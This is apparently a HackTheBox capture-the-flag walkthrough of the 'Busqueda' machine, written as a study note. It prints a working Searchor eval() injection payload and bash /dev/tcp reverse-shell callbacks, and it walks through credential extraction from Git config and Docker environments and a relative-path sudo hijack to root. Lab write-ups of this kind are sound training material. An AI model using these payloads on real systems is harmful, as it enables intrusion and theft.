---
tags: [HTB, Busqueda, Linux, Ubuntu, Apache, Searchor, Python, CommandInjection, GitCredentials, CredentialReuse, Gitea, Docker, Sudo, RelativePath, Easy]
platform: HackTheBox
os: Ubuntu Linux
hostname: busqueda
difficulty: Easy
ip: $BoxIP
status: Complete
domain: searcher.htb
---

# HTB: Busqueda, Full Walkthrough

## The gist

Busqueda is an easy Linux machine where the difficulty is in recognising that several ordinary-looking configuration mistakes form one continuous chain. The public web application uses Searchor 2.4.0 and evaluates user input with Python `eval()`. A carefully quoted search request therefore gives reflected command execution as the `svc` service account.

The foothold becomes useful only after local source and repository review. The web application's Git configuration contains embedded HTTP credentials for the local Gitea service. The credential is reused for SSH as `svc`, where a sudo-enabled system-checkup wrapper exposes Docker environment variables. Those variables disclose the Gitea administrator credential. Finally, the administrator's public scripts reveal that the root-run `full-checkup` action invokes `./full-checkup.sh` relative to the caller's working directory. Placing a controlled helper in the `svc` home directory and invoking the exact sudo rule produces root execution.

Attack chain:

~~~text
Full TCP scan
  -> Apache and SSH
  -> searcher.htb virtual host
  -> Searchor 2.4.0 source fingerprint
  -> Python eval() command injection
  -> command execution as svc
  -> /var/www/app/.git/config exposes Gitea credentials
  -> reused password validates SSH as svc
  -> sudo system-checkup.py
  -> Docker inspect exposes Gitea and MySQL environment values
  -> Gitea administrator access and source review
  -> relative ./full-checkup.sh resolution
  -> root execution
~~~

> [!warning] Evidence boundary
> The private Busqueda workspaces contain the full command and output record, failed callback attempts, source files, repository material, Docker inspection output, credentials, flags, and manual screenshots. This page intentionally contains no passwords, hashes, keys, flag values, or screenshot embeds. Keep those items in private loot only.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Operating system | Ubuntu Linux |
| Hostname | `busqueda` |
| Target | `$BoxIP` |
| Domain | `searcher.htb` |
| Difficulty | Easy |
| Initial access | Searchor 2.4.0 Python `eval()` command injection |
| Foothold identity | `svc` |
| User access | SSH as `svc` after credential reuse |
| Privilege path | Docker environment inspection followed by relative-path sudo script hijack |
| Final proof | Root shell and private proof collection |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | The web application is routed by the `searcher.htb` virtual host | HTTP redirects and Host-header comparison |
| 2 | Searchor 2.4.0 evaluates a Python expression containing user input | Application fingerprint and source review |
| 3 | The search expression can be closed and extended with an imported `os` command | Reflected `id` output showing the `svc` identity |
| 4 | The deployed application repository contains a credential-bearing Git origin | `/var/www/app/.git/config` |
| 5 | The recovered credential is reused for SSH as `svc` | Controlled SSH validation |
| 6 | `svc` may run `system-checkup.py` as root with arbitrary action arguments | `sudo -l` |
| 7 | Docker environment inspection exposes service configuration values | `docker-inspect` action output |
| 8 | Gitea provides an administrator account and readable script repository | Local Gitea API and administrator repository |
| 9 | `full-checkup` invokes a relative helper path as root | `arg_list = ['./full-checkup.sh']` in the recovered source |

## Evidence and loot

The manual source workspace is:

`/home/kali/Platforms/HackTheBox/Busqueda/`

The autonomous command workspace is:

`/tmp/codex_Busqueda-10-129-228-217-20260915/`

The autonomous workspace contains the command-by-command replay structure:

- `command-index.log`: numbered command index
- `commands/`: one shell command file per step
- `outputs/`: separate command outputs and metadata
- `transcript.log`: narrative terminal transcript
- `notes/handoff.md`: completion summary, gotchas, and repeatable route
- `loot/`: private credentials, flags, responses, and proof artifacts
- `nmap/`: full TCP and service scans
- `exploits/`: reviewed helper scripts and exploit material

Important private evidence includes:

| Evidence | Private location |
|---|---|
| Full TCP and service scans | `$BoxDir/nmap/` |
| Manual walkthrough log | `/home/kali/Platforms/HackTheBox/Busqueda/Busqueda.log` |
| Searchor request and response evidence | `$BoxDir/loot/` and the manual workspace log |
| Deployed application repository material | `$BoxDir/loot/` and target-side `/var/www/app/.git/` evidence |
| Docker environment inspection | `$BoxDir/loot/` |
| Gitea repository and source review | `$BoxDir/loot/` |
| Credentials | `$BoxDir/loot/credentials.txt` and manual `loot/creds.txt` |
| User and root proof | `$BoxDir/loot/user.txt`, `$BoxDir/loot/root.txt`, and private flags files |
| Numbered autonomous replay | `$BoxDir/command-index.log`, `$BoxDir/commands/`, `$BoxDir/outputs/` |
| Manual screenshots | `/home/kali/Platforms/HackTheBox/Busqueda/screenshots/` only |

Sensitive values remain in private loot. The vault records where the evidence lives and how to reproduce the decisions without reproducing the values.

## Variables

Use the standard workspace variables. Keep recovered credentials in private environment or loot files rather than entering them into this page.

~~~bash
boxstart $BoxName $BoxIP htb
htblog
boxset BoxName Busqueda
boxset BoxIP $BoxIP
boxset Domain searcher.htb
boxset FQDN searcher.htb
boxset GitHost gitea.searcher.htb
boxset WebPort 80
boxset SshPort 22
boxset Port 4444
boxset Username svc
boxset GitRepo /var/www/app
boxset SudoScript /opt/scripts/system-checkup.py
boxset GiteaPort 3000
boxset ContainerName gitea
boxset DatabaseContainer mysql_db
~~~

For a manual replay, load only the private values after they have been recorded in loot:

~~~bash
source "$BoxDir/.env"
~~~

> [!warning] Variable discipline
> `$BoxIP`, `$LocalIP`, `$BoxDir`, `$FQDN`, `$Username`, `$SudoScript`, and `$ContainerName` are intentionally used instead of hard-coded run values. Do not place passwords, flags, hashes, or API tokens into shell history, screenshots, handoff notes, or the vault.

## 1. Initialise the session and preserve evidence

The first task is to establish the box marker, workspace, callback address, and transcript. This matters on a box with multiple false leads because a failed payload, a successful reflected command, and a credential-validation attempt must remain distinguishable.

~~~bash
boxstart $BoxName $BoxIP htb
htblog
boxset BoxName Busqueda
boxset BoxIP $BoxIP
boxset Domain searcher.htb
boxset FQDN searcher.htb
boxset WebPort 80
boxset SshPort 22
boxset Port 4444
~~~

Confirm the active values before the first request:

~~~bash
printf 'Target=%s\nLocal=%s\nFQDN=%s\nBoxDir=%s\n' \\
  "$BoxIP" "$LocalIP" "$FQDN" "$BoxDir"
ip addr show tun0
ip route get "$BoxIP"
ping -c 1 "$BoxIP"
~~~

The manual workspace contains the tutor-run screenshots. They remain outside the vault because this vault uses text evidence and private artifact paths rather than embedded PNG files.

## 2. Discover the complete TCP surface

The full scan determines whether the box is a simple web target or has a secondary authenticated service. On Busqueda, SSH is the later transition from reflected web command execution to a stable local shell.

~~~bash
sudo nmap -Pn -n -sT -p- --min-rate 5000 \\
  "$BoxIP" -oA "$BoxDir/nmap/allports"
~~~

Follow with a focused service scan using every open port from the saved all-ports result:

~~~bash
boxset OpenPorts "22,80"
sudo nmap -Pn -n -sT -sC -sV -p "$OpenPorts" \\
  "$BoxIP" -oA "$BoxDir/nmap/services"
~~~

The important result was OpenSSH on TCP/22 and Apache 2.4.52 on TCP/80. No Metasploit was used. The scan was saved before web testing so the later hostname and application conclusions can be checked against the initial evidence.

> [!warning] Gotcha
> A raw SYN scan can fail in restricted Kali environments. `-sT` uses a normal TCP connection and is a reliable fallback when the raw socket route is unavailable. A scan result is not complete until it is saved and the focused scan includes every open port.

## 3. Resolve the web host and compare virtual-host responses

The HTTP service redirects to `searcher.htb`. Name-based routing is part of the application surface, so request the IP and the hostname separately and preserve both responses.

~~~bash
printf '%s\t%s\n' "$BoxIP" "$FQDN" | sudo tee -a /etc/hosts
curl -sS -i "http://$BoxIP:$WebPort/" \\
  | tee "$BoxDir/loot/http-ip.txt"
curl -sS -i --resolve "$FQDN:$WebPort:$BoxIP" \\
  "http://$FQDN:$WebPort/" \\
  | tee "$BoxDir/loot/http-fqdn.txt"
~~~

The `Host` header decides which Apache virtual host handles the request. The correct application was the search page on `searcher.htb`, not the bare IP response.

Enumerate the page and common paths with bounded output capture:

~~~bash
curl -sS --resolve "$FQDN:$WebPort:$BoxIP" \\
  "http://$FQDN:$WebPort/" -o "$BoxDir/loot/searcher-home.html"
gobuster dir -u "http://$FQDN:$WebPort/" \\
  -w /usr/share/wordlists/dirb/common.txt \\
  -o "$BoxDir/nmap/gobuster-root.txt"
~~~

The page identified Searchor and disclosed version information sufficient to route the next step to source review and manual injection testing.

> [!warning] Gotcha
> If a hostname-based application redirects or returns a generic page, do not conclude that the service is empty. Preserve the IP response, add the hostname to `/etc/hosts`, and repeat the request with the correct `Host` value.

## 4. Fingerprint Searchor and review the evaluation boundary

The decisive clue was the application identity, Searchor 2.4.0. SearchSploit did not provide a useful direct result, so the route required manual research and source-level reasoning. The important question was not only which product was installed, but where the submitted search value entered the Python expression.

Save the relevant application response before testing it:

~~~bash
curl -sS --resolve "$FQDN:$WebPort:$BoxIP" \\
  "http://$FQDN:$WebPort/" \\
  | grep -Ein 'searchor|version|engine|query' \\
  | tee "$BoxDir/loot/searchor-fingerprint.txt"
searchsploit "Searchor 2.4.0"
~~~

Searchor's vulnerable pattern is conceptually equivalent to:

~~~python
eval(f"Engine.{engine}.search('{query}')")
~~~

The `query` value is inserted between the single quotes inside a Python expression. If the value closes that quote, adds a second Python expression, and comments out the remainder, the server evaluates attacker-controlled code. This is Python expression injection through `eval()`, not a shell injection at the first stage.

> [!warning] Technical distinction
> The initial payload is Python code executed by `eval()`. The later `os.popen()` call launches the operating-system command. Keeping those layers separate makes quote errors easier to diagnose.

## 5. Prove reflected command execution with `id`

Always prove the execution primitive with a harmless identity command before requesting a callback. A reflected `uid=` line establishes that the expression, import, command, output capture, and response path all work.

The working structure closes the original query string, evaluates `__import__('os').popen('id').read()`, and uses `#` to comment out the remaining Python expression:

~~~bash
curl -sS --resolve "$FQDN:$WebPort:$BoxIP" \\
  -X POST \\
  --data-urlencode "engine=Accuweather" \\
  --data-urlencode "query=test'),__import__('os').popen('id').read()#" \\
  "http://$FQDN:$WebPort/search" \\
  | tee "$BoxDir/loot/searchor-id-response.txt"
~~~

The response returned the `svc` identity. That output is the foothold proof, while the HTTP response itself remains private evidence.

### Payload anatomy

| Fragment | Purpose |
|---|---|
| `test'` | Closes the quote opened by the application around `query` |
| `)` | Closes the original `search()` call |
| `__import__('os')` | Imports the standard Python OS module without a separate import statement |
| `.popen('id')` | Runs a harmless operating-system command and returns a file-like object |
| `.read()` | Places the command output into the evaluated expression's result |
| `#` | Comments out the trailing characters from the original application expression |
| `--data-urlencode` | Preserves quotes, parentheses, spaces, and comment characters in the POST body |

> [!warning] Gotcha
> Searchor payloads are quote-sensitive. An unencoded `&`, `+`, `#`, or space can be consumed by the form parser or the local shell before it reaches Python. Use `--data-urlencode`, preserve the application field names, and compare the response to a baseline.

## 6. Transition from reflected RCE to a stable shell

The reflected `id` result proves code execution, but it is not a durable terminal. The manual route used a Bash callback with a listener prepared first, then stabilised the received shell with a PTY. If the callback does not arrive, retain the positive `id` proof and troubleshoot delivery separately.

On Kali, start the listener before the request:

~~~bash
nc -lvnp "$Port"
~~~

From a second Kali terminal, send a Bash callback through the same Searchor expression. The nested command is deliberately kept in a variable so the target address and port are visible before delivery:

~~~bash
Callback="bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'"
curl -sS --max-time 15 --resolve "$FQDN:$WebPort:$BoxIP" \\
  -X POST \\
  --data-urlencode "engine=Accuweather" \\
  --data-urlencode "query=test'),__import__('os').popen('$Callback').read()#" \\
  "http://$FQDN:$WebPort/search" >/dev/null
~~~

If the callback arrives as a raw shell, upgrade it before local enumeration:

~~~bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

Press `Ctrl+Z` locally, then run:

~~~bash
stty raw -echo
fg
export TERM=xterm
stty rows 40 columns 120
~~~

Verify the shell immediately:

~~~bash
id
whoami
hostname
~~~

The stable manual foothold was `svc` on `busqueda`.

> [!warning] Callback gotcha
> The private autonomous transcript recorded that direct reverse-shell variants were unreliable even though reflected command output and a one-shot TCP proof worked. Separate execution proof from callback proof. Check `$LocalIP`, listener state, port reachability, Bash availability, and nested quoting in that order. Once a usable credential is found, SSH is a cleaner stable-shell transition than repeating an unreliable callback.

## 7. Search the deployed application repository

Once command execution is available, search the deployed application's repository before broad privilege escalation. The `.git` directory is a high-value source of deployment history, remote URLs, usernames, and accidentally embedded credentials.

Locate the repository and preserve its metadata privately:

~~~bash
find /var/www /opt /home -type f -path '*/.git/config' -print 2>/dev/null
git -C "$GitRepo" status --short
git -C "$GitRepo" log --oneline --all
~~~

Read the repository configuration only in the private terminal or redirect it to protected loot:

~~~bash
cat "$GitRepo/.git/config" > "$BoxDir/loot/git-config.txt"
chmod 600 "$BoxDir/loot/git-config.txt"
grep -Ein 'url|credential|user|password|gitea' "$BoxDir/loot/git-config.txt"
~~~

The origin URL contained embedded HTTP authentication for the `cody/Searcher_site` repository on `gitea.searcher.htb`. The credential was saved privately and treated as a candidate, not as proof of access.

### Why `.git/config` mattered

`.git/config` is not just a repository locator. A developer may clone or push over HTTP using a URL such as `http://user:password@host/owner/repository.git`. If the application directory is readable by the web process, the complete credential can survive in the deployed copy even when the source tree no longer contains it.

This is different from searching only the current source files. Check the config, commit history, remotes, hooks, and ignored files, while keeping any values private:

~~~bash
git -C "$GitRepo" remote -v
git -C "$GitRepo" log --all --stat
git -C "$GitRepo" fsck --no-reflogs --unreachable 2>/dev/null
~~~

> [!warning] Credential boundary
> A credential in a remote URL is sensitive evidence. Save the original bytes privately, record the source and likely scope, then validate it once against the most plausible service. Do not spray an unscoped credential across unrelated services.

## 8. Validate credential reuse through SSH

The Git-origin username and password were not accepted as a direct SSH login for the Git user. The useful transition was password reuse against the local `svc` account. This is why each recovered credential needs a target-specific validation plan rather than an assumption that the source username is also the operating-system account.

Enter the private password at the SSH prompt. Do not put it in the command line:

~~~bash
ssh -o PreferredAuthentications=password \\
  -o PubkeyAuthentication=no \\
  "$Username@$BoxIP"
~~~

Prove the account and host after authentication:

~~~bash
id
whoami
hostname
pwd
~~~

The SSH session as `svc` was the reliable local-enumeration channel. Read the user proof file only into private loot or a protected terminal record:

~~~bash
cat "/home/$Username/user.txt" > "$BoxDir/loot/user.txt"
chmod 600 "$BoxDir/loot/user.txt"
~~~

Do not copy its contents into the vault.

> [!warning] Gotcha
> The Git credential's original username and its successful SSH account were different. Record source, candidate account, service tested, and result separately. The reuse relationship is the finding.

## 9. Enumerate the exact sudo boundary

Run `sudo -l` as soon as the stable user session exists. Busqueda does not use a generic GTFOBins binary. It uses a root-run Python wrapper whose action argument chooses additional behavior, so the script must be read before any action is trusted.

~~~bash
sudo -l
~~~

The material rule was equivalent to:

~~~text
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
~~~

Preserve and inspect the script:

~~~bash
sed -n '1,260p' "$SudoScript"
grep -nE 'docker|subprocess|Popen|run|full-checkup|arg_list|action' \\
  "$SudoScript"
~~~

The available actions were:

| Action | Effect |
|---|---|
| `docker-ps` | Lists running Docker containers |
| `docker-inspect` | Inspects a named container with a supplied format string |
| `full-checkup` | Runs the administrator repository's full system checkup helper |

The wildcard makes the action and its arguments attacker-controlled. It does not automatically imply that every action is exploitable, so each branch still needs source review.

## 10. Inspect Docker containers through the sudo wrapper

The `docker-ps` action is a safe inventory step. It revealed a local Gitea container and a MySQL container bound to loopback services.

~~~bash
sudo /usr/bin/python3 "$SudoScript" docker-ps \\
  | tee "$BoxDir/loot/docker-ps.txt"
~~~

The correct `docker-inspect` syntax uses a Go template format string followed by the container name. The JSON format is useful because it returns the complete environment array in one machine-readable value:

~~~bash
boxset DockerFormat '{{json .Config.Env}}'
sudo /usr/bin/python3 "$SudoScript" docker-inspect \\
  "$DockerFormat" "$ContainerName" \\
  > "$BoxDir/loot/$ContainerName-env.json"
chmod 600 "$BoxDir/loot/$ContainerName-env.json"
~~~

Inspect the second container privately as well:

~~~bash
sudo /usr/bin/python3 "$SudoScript" docker-inspect \\
  "$DockerFormat" "$DatabaseContainer" \\
  > "$BoxDir/loot/$DatabaseContainer-env.json"
chmod 600 "$BoxDir/loot/$DatabaseContainer-env.json"
~~~

Search only for variable names when producing shared notes. Keep values in private loot:

~~~bash
grep -oE '"[A-Z0-9_]*(USER|USERNAME|PASSWORD|PASS|DB|ADMIN)[A-Z0-9_]*"' \\
  "$BoxDir/loot/$ContainerName-env.json" \\
  "$BoxDir/loot/$DatabaseContainer-env.json"
~~~

The Gitea environment disclosed the database connection settings and the MySQL environment disclosed the database root password. The important lesson is that `docker inspect` exposes environment values even when the service itself is bound to localhost.

### Docker format gotcha

The wrapper expected the format and container name as separate positional arguments. A command with only a container name was not equivalent to a normal `docker inspect` invocation and produced a usage or formatting failure. Preserve the literal `{{json .Config.Env}}` template and pass the exact container name shown by `docker-ps`.

> [!warning] Secret handling
> Docker environment output is credential material. Save it with restrictive permissions, inspect it locally, and use names and source paths in the write-up. Never paste the environment values into a shared transcript or vault note.

## 11. Enumerate the local Gitea service

The Gitea service was not part of the external port surface. It ran inside Docker and listened on loopback TCP/3000. The service could therefore be queried from the `svc` shell even though it was not reachable directly from Kali.

Confirm the local listener and query the unauthenticated user-search endpoint:

~~~bash
ss -lntp | grep ':3000'
curl -sS "http://127.0.0.1:$GiteaPort/api/v1/users/search?limit=50" \\
  > "$BoxDir/loot/gitea-users.json"
python3 -m json.tool "$BoxDir/loot/gitea-users.json" \\
  | grep -E 'login|username|is_admin|full_name'
~~~

The API identified the `administrator` account and the `cody` account. The Docker environment candidate was then validated against the Gitea login scope rather than being sprayed across unrelated services.

Use the private administrator value with the API or web login. The command below keeps the credential in a private shell variable and writes the response to protected loot:

~~~bash
boxset AdminUser administrator
curl -sS -u "$AdminUser:$AdminPassword" \\
  "http://127.0.0.1:$GiteaPort/api/v1/user" \\
  > "$BoxDir/loot/gitea-authenticated-user.json"
chmod 600 "$BoxDir/loot/gitea-authenticated-user.json"
grep -E 'login|is_admin|full_name' \\
  "$BoxDir/loot/gitea-authenticated-user.json"
~~~

An `is_admin` result established that the candidate was an administrator credential, not merely a valid low-privilege Gitea login.

## 12. Review the administrator scripts and identify the relative path flaw

The administrator's Gitea repositories exposed the source that the sudo wrapper was intended to run. Source review was the decision-changing action. The relevant code path built a list containing a relative helper:

~~~python
arg_list = ['./full-checkup.sh']
subprocess.run(arg_list)
~~~

A relative path is resolved from the process current working directory. The Python script does not resolve `full-checkup.sh` relative to its own directory. Because sudo preserves the caller's current working directory while changing the effective user for the command, a caller-controlled file in a writable working directory can replace the intended helper.

Clone or download the administrator repository only into private loot, then inspect the exact scripts:

~~~bash
mkdir -p "$BoxDir/loot/gitea-admin-repo"
git clone "http://$AdminUser:$AdminPassword@$GitHost/$AdminUser/scripts.git" \\
  "$BoxDir/loot/gitea-admin-repo"
grep -RniE 'full-checkup|arg_list|subprocess|system-checkup' \\
  "$BoxDir/loot/gitea-admin-repo"
~~~

If a remote URL contains a password, avoid leaving it in shell history in a real run. Prefer a browser/API login or a private temporary credential source. The command is shown to make the repository path explicit; the actual values remain private.

The crucial distinction is:

| Safe-looking assumption | Actual behavior |
|---|---|
| `full-checkup.sh` is a fixed file owned by the administrator | `./full-checkup.sh` is resolved from the caller's current directory |
| The root script protects the helper by its name | The directory containing the helper is not fixed |
| Running `sudo` changes only the user | The child process inherits the caller's current working directory |

## 13. Exploit the relative helper from the correct working directory

The manual exploit uses a controlled helper and a listener. Preserve the original environment and do not place the helper in a broad shared directory. The caller's home directory is writable by `svc` and is the correct working directory for the test.

Create the helper in the `svc` home directory:

~~~bash
printf '%s\n' \\
  '#!/bin/bash' \\
  "bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" \\
  > "/home/$Username/full-checkup.sh"
chmod 700 "/home/$Username/full-checkup.sh"
sed -n '1,20p' "/home/$Username/full-checkup.sh"
~~~

Start the listener from Kali:

~~~bash
nc -lvnp "$Port"
~~~

In the SSH shell, change directory before invoking sudo. This ordering is essential because the relative helper is resolved against the current working directory:

~~~bash
cd "/home/$Username"
pwd
sudo /usr/bin/python3 "$SudoScript" full-checkup
~~~

The Python wrapper now launches `/home/$Username/full-checkup.sh` as root. Verify the received shell immediately:

~~~bash
id
whoami
hostname
~~~

The root proof is stored privately:

~~~bash
cat /root/root.txt > "$BoxDir/loot/root.txt"
chmod 600 "$BoxDir/loot/root.txt"
~~~

### Relative-path failure modes

| Attempt | Result | Lesson |
|---|---|---|
| Run `full-checkup` from `/tmp` while the helper is in the home directory | The intended relative file is not found or the wrong directory is used | The current working directory controls resolution |
| Put a helper in the repository directory without checking the caller's cwd | No execution if sudo starts elsewhere | The script's location and the cwd are different concepts |
| Use a command with malformed quoting | Helper is created incorrectly or the callback never launches | Validate the helper locally with `sed` before triggering sudo |
| Start the listener after invoking sudo | The callback can be missed | Prepare the listener first |

The first autonomous attempt from the wrong directory failed for exactly this reason. Changing to `/home/$Username` before running the sudo command produced reliable root execution.

> [!warning] Safer proof option
> For a controlled exam or lab proof, a helper that writes a root-owned marker and identity output to private temporary loot is less fragile than a callback. Once the root execution is proven, read the marker and remove the helper. The callback sequence above follows the manual tutor walkthrough.

## 14. Validate the complete chain and close out

Collect only the proof needed to establish the final identity and preserve it in private loot:

~~~bash
id
whoami
hostname
cat /home/$Username/user.txt > "$BoxDir/loot/user.txt"
cat /root/root.txt > "$BoxDir/loot/root.txt"
chmod 600 "$BoxDir/loot/user.txt" "$BoxDir/loot/root.txt"
~~~

Record the artifact paths, command index, and cleanup in the transcript. Remove the controlled helper and stop local listeners after the proof:

~~~bash
rm -f "/home/$Username/full-checkup.sh"
ss -ltnp | grep -E ":$Port|:$WebPort" || true
boxdone
~~~

No flag values belong in this note. The private loot files are the authoritative proof artifacts.

## 15. Gotchas and dead ends

| Gotcha or dead end | What it taught us |
|---|---|
| UDP or raw-socket scan behavior can fail locally | Use `-sT` when raw sockets are unavailable and save the successful rerun |
| The bare IP did not show the final application cleanly | Apache name-based routing made `$FQDN` and `/etc/hosts` part of enumeration |
| SearchSploit did not hand over a ready-made route | Product fingerprinting plus source review can be more useful than exploit-database search alone |
| Searchor's payload is quote-sensitive | Treat Python quoting, shell quoting, URL encoding, and form parsing as separate layers |
| Direct reverse-shell payloads were unreliable | Keep reflected `id` proof, diagnose callbacks independently, and prefer SSH once the credential pivot exists |
| The Git-origin user was not the successful SSH account | Validate recovered credentials against the account suggested by the environment |
| `sudo -l` did not expose a standard GTFOBins binary | Read custom scripts and every helper they call |
| `docker-inspect` failed with incomplete arguments | The wrapper requires a Go template format followed by a container name |
| Gitea was not externally exposed | Local loopback services become reachable after foothold; rerun `ss -lntp` locally |
| The first relative-path trigger was run from the wrong directory | `./helper` resolves from the caller's cwd, not the Python script directory |
| Secrets appeared in Docker environment and Git configuration | Restrict permissions, separate raw evidence from analysis, and never paste values into the vault |

## 16. RUNBOOK V2 stages used

- [[OSCP/RUNBOOK V2/Start Here|Start Here]]: workspace, target, callback, and evidence setup
- [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]: complete TCP discovery and service routing
- [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]]: OpenSSH and Apache identification
- [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]]: virtual-host routing and Searchor fingerprinting
- [[OSCP/RUNBOOK V2/Linux - Command Injection|Linux - Command Injection]]: Python `eval()` proof through a controlled `id` request
- [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]]: reflected RCE to callback and SSH fallback
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux - Shell Stabilise]]: PTY and terminal recovery
- [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]]: identity, loopback services, Git repository, and sudo checks
- [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux - Credential Search]]: `.git/config` embedded credential review and controlled reuse
- [[OSCP/RUNBOOK V2/Linux - Docker Enumeration|Linux - Docker Enumeration]]: container inventory and environment inspection
- [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]]: custom sudo wrapper and relative helper analysis
- [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]]: private evidence, helper removal, listener closure, and box closeout

## Attack chain

1. Full TCP enumeration identified SSH and Apache.
2. Host-header comparison and redirect handling identified `searcher.htb`.
3. Searchor 2.4.0 was fingerprinted and its Python `eval()` construction was reviewed.
4. A quote-closing payload returned `id` output as `svc`.
5. The deployed application's `.git/config` exposed embedded Gitea HTTP credentials.
6. The credential was reused successfully for SSH as `svc`.
7. `sudo -l` exposed `/opt/scripts/system-checkup.py *` as root.
8. The wrapper's Docker actions exposed Gitea and MySQL environment values.
9. The Gitea administrator account and scripts repository were validated locally.
10. `full-checkup` was shown to invoke `./full-checkup.sh` from the inherited current directory.
11. A controlled helper in `/home/$Username` executed through the sudo wrapper and returned a root proof.

## Credentials and access transitions

| Account or material | Source | Use |
|---|---|---|
| Searchor service identity `svc` | Reflected `id` output | Initial command-execution context |
| Gitea repository credential | `/var/www/app/.git/config` | Local Gitea validation and source access |
| `svc` SSH credential | Reused Git-origin credential | Stable shell and sudo enumeration |
| Gitea administrator credential | Gitea container environment | Authenticated API and repository review |
| MySQL environment credential | MySQL container environment | Confirms container secret exposure; not required for the winning path |

Credential values are stored only in private loot.

## Flags

| Proof | Status | Private location |
|---|---|---|
| `user.txt` | Confirmed | `$BoxDir/loot/user.txt` |
| `root.txt` | Confirmed | `$BoxDir/loot/root.txt` |

The contents are intentionally omitted.

## Key lessons

- A web application version that has no convenient SearchSploit hit can still be exploitable when source review exposes an unsafe `eval()` boundary.
- Command-injection diagnosis should prove the interpreter layer first. Here, Python expression construction came before the OS command launched by `os.popen()`.
- `.git/config` deserves the same attention as application source files. Deployment remotes can preserve credentials that are absent from the working tree.
- Credential reuse is an evidence chain, not a username assumption. The Gitea repository user and the successful Linux account were different.
- Docker is a credential boundary. A local inspection wrapper can expose environment secrets even when the container ports are loopback-only.
- Custom sudo scripts must be read line by line. `./full-checkup.sh` was not anchored to the script directory, so the caller controlled which file root executed.
- Relative-path vulnerabilities are defined by process cwd. A correct helper in the wrong directory is still a failed exploit.
- When no box hints are available, disciplined enumeration, response comparison, source review, and careful artifact handling replace guesswork.

## Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]]: application foothold, private credential recovery, SSH transition, and argument-aware sudo abuse
- [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]]: web evidence recovery, credential reuse, and Linux capability escalation
- [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]]: source-driven Python application analysis, SSH-key recovery, and Git-history review
- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]]: source review followed by shell execution through a privileged scheduled path
- [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]]: harmless command proof, callback separation, shell stabilization, and exact sudo interpreter review
- [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]]: application artifact review, credential reuse, SSH validation, and direct sudo escalation
- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]]: web command execution, local script review, and chained privilege boundaries

## External resources

- [Searchor 2.4.0 command-injection proof of concept](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)
- [Docker container inspect reference](https://docs.docker.com/reference/cli/docker/inspect/)
- [Gitea API documentation](https://docs.gitea.com/api/1.24/)
- [HackTricks command injection reference](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/command-injection.md)
- [GTFOBins](https://gtfobins.github.io/) for comparison when a sudo rule names a standard binary

## Completion checklist

- [x] Full TCP scan saved
- [x] Focused service scan saved
- [x] Correct virtual host resolved
- [x] Searchor version and vulnerable evaluation boundary documented
- [x] Harmless reflected command proof documented
- [x] Stable shell transition documented
- [x] Git credential source documented without exposing the value
- [x] SSH credential reuse documented
- [x] Exact sudo rule and custom script reviewed
- [x] Docker containers and environment exposure documented
- [x] Gitea administrator and script source reviewed
- [x] Relative-path helper execution documented
- [x] User and root proof stored in private loot
- [x] Sensitive values excluded from the vault
- [x] No screenshots embedded in the vault
- [x] Runbook, module, appendix, breakdown, FAQ, and hub links updated and cross-checked

#### Tags: #HTB #Busqueda #Linux #Searchor #Python #CommandInjection #GitCredentials #Gitea #Docker #Sudo #RelativePath #CredentialReuse
